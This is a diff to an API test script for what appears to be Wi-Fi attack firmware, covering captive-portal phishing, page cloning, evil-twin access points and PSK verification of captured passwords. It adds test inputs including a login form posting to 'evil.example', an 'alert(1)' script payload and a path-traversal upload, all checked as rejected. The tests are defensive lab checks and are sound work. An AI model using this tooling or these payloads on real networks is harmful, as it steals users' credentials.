@@ -673,18 +673,22 @@ if (DEV) {
 
   console.log('evil portal');
   const portalDir = '/sd/data/evilportal/portals';
-  const portalLab = portalDir + '/p9-api-lab.html', portalBad = portalDir + '/p9-api-bad.html';
+  const portalLab = portalDir + '/p9-api-lab.html', portalBad = portalDir + '/p9-api-bad.html', portalUnsafe = portalDir + '/p9-api-unsafe.html', portalClone = portalDir + '/cloned.html';
   await call('DELETE', `/api/files?path=${q(portalLab)}`);
   await call('DELETE', `/api/files?path=${q(portalBad)}`);
+  await call('DELETE', `/api/files?path=${q(portalUnsafe)}`);
+  await call('DELETE', `/api/files?path=${q(portalClone)}`);
   const customHtml = '<!doctype html><html><head><title>Lab custom</title></head><body><h1>SD-TEMPLATE-MARKER</h1><form method="post" action="/login"><input name="username"><input type="password" name="password"><button>Connect</button></form></body></html>';
   r = await call('PUT', `/api/files/content?path=${q(portalLab)}`, customHtml, { raw: true });
   check('custom portal HTML uploads to fixed SD folder', r.status === 200, r.json);
   await call('PUT', `/api/files/content?path=${q(portalBad)}`, '<html><script>alert(1)</script></html>', { raw: true });
+  await call('PUT', `/api/files/content?path=${q(portalUnsafe)}`, customHtml + '<form method="post" action="//evil.example/login"><input name="username"><input name="password"></form>', { raw: true });
   r = await call('PUT', `/api/files/content?path=${q(portalDir + '/../escape.html')}`, customHtml, { raw: true });
   check('portal template path traversal fails closed', r.status === 400, r.json);
   r = await call('POST', '/api/evilportal/templates/reload', {});
-  check('portal reload accepts valid template and reports malformed file', r.status === 200 && r.json?.count >= 1 && r.json?.rejected >= 1, r.json);
+  check('portal reload accepts valid template and reports malformed file', r.status === 200 && r.json?.count >= 1 && r.json?.rejected >= 2, r.json);
   r = await call('GET', '/api/evilportal');
+  check('protocol-relative external form fails closed', !r.json?.templates?.some(t => t.name === 'p9-api-unsafe'), r.json?.templates);
   const customTemplate = r.json?.templates?.find(t => t.builtin === false && t.name === 'p9-api-lab');
   check('SD template catalog survives reload with stable custom ID', customTemplate?.id >= 100 && r.json?.templateError, r.json?.templates);
   r = await call('POST', '/api/evilportal/start', { ssid: 'Custom Lab', templateId: customTemplate?.id, authorized: true });
@@ -712,12 +716,64 @@ if (DEV) {
   r = await call('GET', '/api/evilportal/captures');
   check('masked capture preserves only first and last character', r.json?.captures?.some(c => c.username === 'alice' && c.password === 's****t'), r.json);
   r = await call('PUT', '/api/evilportal/settings', { verify: true });
-  check('unimplemented PSK verification is an explicit error', r.status === 503 && r.json?.error === 'unavailable', r.json);
+  check('PSK verification setting is available', r.status === 200, r.json);
   r = await call('POST', '/api/evilportal/clone', { ssid: 'Open AP' });
-  check('unimplemented page cloning never fakes success', r.status === 503 && r.json?.error === 'unavailable', r.json);
+  check('page cloning requires explicit authorization', r.status === 400 && r.json?.error === 'authorization_required', r.json);
   await call('POST', '/api/evilportal/clear', {});
   r = await call('GET', '/api/evilportal/captures');
   check('portal captures clear', r.json?.captures?.length === 0, r.json);
+  await call('POST', '/api/evilportal/stop', {});
+
+  r = await call('POST', '/api/evilportal/clone', { ssid: 'Open Lab AP', authorized: true });
+  check('safe page cloning starts asynchronously', r.status === 202 && r.json?.cloning === true, r.json);
+  if (DEV) {
+    r = await call('POST', '/api/_dev/evilportal', { action: 'clone', ok: true });
+    check('simulator completes authorized page clone', r.status === 200, r.json);
+    r = await call('GET', '/api/evilportal');
+    check('clone saves bounded SD template and reloads catalog', r.json?.cloning === false && r.json?.cloneName === 'cloned.html' && r.json?.cloneBytes > 0 && r.json?.templates?.some(t => t.name === 'cloned'), r.json);
+  } else {
+    r = await call('GET', '/api/evilportal');
+    check('watch clone exposes in-progress state', r.status === 200 && r.json?.cloning === true, r.json);
+    await call('POST', '/api/evilportal/stop', {});
+  }
+  if (DEV) {
+    await call('POST', '/api/evilportal/clone', { ssid: 'Unsafe Lab AP', authorized: true });
+    r = await call('POST', '/api/_dev/evilportal', { action: 'clone', ok: false });
+    check('clone failure injection completes without success', r.status === 200, r.json);
+    r = await call('GET', '/api/evilportal');
+    check('failed clone remains explicit and cancellable', r.json?.cloning === false && /failed/i.test(r.json?.error || ''), r.json);
+  }
+
+  await call('PUT', '/api/evilportal/settings', { pwdMode: 2, verify: true });
+  r = await call('POST', '/api/evilportal/start-twin', { ssid: 'WPA2 Lab', bssid: '02:00:00:00:00:60', channel: 6, coherent: true, authorized: true });
+  check('coherent twin requires known lab PSK', r.status === 400 && /PSK/.test(r.json?.message || ''), r.json);
+  r = await call('POST', '/api/evilportal/start-twin', { ssid: 'WPA2 Lab', bssid: '02:00:00:00:00:60', channel: 6, coherent: true, psk: 'lab-password', authorized: true });
+  check('WPA2-coherent twin starts with supplied lab PSK', r.status === 200, r.json);
+  r = await call('GET', '/api/evilportal');
+  check('twin status reports coherent security', r.json?.active === true && r.json?.coherent === true, r.json);
+  if (DEV) {
+    await call('POST', '/api/_dev/evilportal', { action: 'creds', username: 'good', password: 'lab-password' });
+    let verification = null;
+    for (let i = 0; i < 20; i++) {
+      await new Promise(x => setTimeout(x, 100));
+      verification = (await call('GET', '/api/evilportal/captures')).json?.captures?.at(-1)?.verification;
+      if (verification === 'checking') break;
+    }
+    check('captured PSK enters verification queue', verification === 'checking', verification);
+    await call('POST', '/api/_dev/evilportal', { action: 'verify', valid: true });
+    await call('POST', '/api/_dev/evilportal', { action: 'creds', username: 'bad', password: 'wrong-password' });
+    for (let i = 0; i < 20; i++) {
+      await new Promise(x => setTimeout(x, 100));
+      verification = (await call('GET', '/api/evilportal/captures')).json?.captures?.at(-1)?.verification;
+      if (verification === 'checking') break;
+    }
+    await call('POST', '/api/_dev/evilportal', { action: 'verify', valid: false });
+    r = await call('GET', '/api/evilportal/captures');
+    check('per-capture PSK results distinguish valid and invalid', r.json?.captures?.[0]?.verification === 'valid' && r.json?.captures?.[1]?.verification === 'invalid' && r.json.captures.every(c => c.password === '******'), r.json);
+    r = await call('GET', '/api/evilportal');
+    check('PSK verification counters agree with capture results', r.json?.settings?.verifiedOk === 1 && r.json?.settings?.verifiedBad === 1, r.json?.settings);
+  }
+  await call('POST', '/api/evilportal/clear', {});
   await call('POST', '/api/evilportal/stop', {});
 
   r = await call('POST', '/api/evilportal/karma-scan', { seconds: 1 });
@@ -746,6 +802,8 @@ if (DEV) {
   }
   await call('DELETE', `/api/files?path=${q(portalLab)}`);
   await call('DELETE', `/api/files?path=${q(portalBad)}`);
+  await call('DELETE', `/api/files?path=${q(portalUnsafe)}`);
+  await call('DELETE', `/api/files?path=${q(portalClone)}`);
   await call('POST', '/api/evilportal/templates/reload', {});
 
   console.log('deauth flood');
